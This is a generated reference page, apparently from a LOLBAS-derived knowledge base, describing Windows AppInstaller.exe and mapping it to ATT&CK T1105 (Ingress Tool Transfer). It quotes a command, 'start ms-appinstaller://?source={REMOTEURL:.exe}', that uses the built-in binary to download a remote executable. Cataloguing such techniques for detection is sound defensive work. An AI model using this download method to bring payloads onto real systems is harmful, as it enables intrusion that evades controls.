---
parsed_by: focuslocust
source: lolbas
type: generated
---
# AppInstaller.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `appinstaller.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/AppInstaller.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Tool used for installation of AppX/MSIX applications on Windows 10

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/appinstaller.md)
- Source verification: [source record](../../sources/lolbas/appinstaller.exe.md)

## Aliases

- `AppInstaller.exe`
- `appinstaller.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: start ms-appinstaller://?source={REMOTEURL:.exe} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/appinstaller.exe.md)

## Source Verification

[source record](../../sources/lolbas/appinstaller.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@notwhickey'
Person: Wade Hickey
Author: Wade Hickey
Commands:
- Category: Download
Command: start ms-appinstaller://?source={REMOTEURL:.exe}
Description: AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from
```
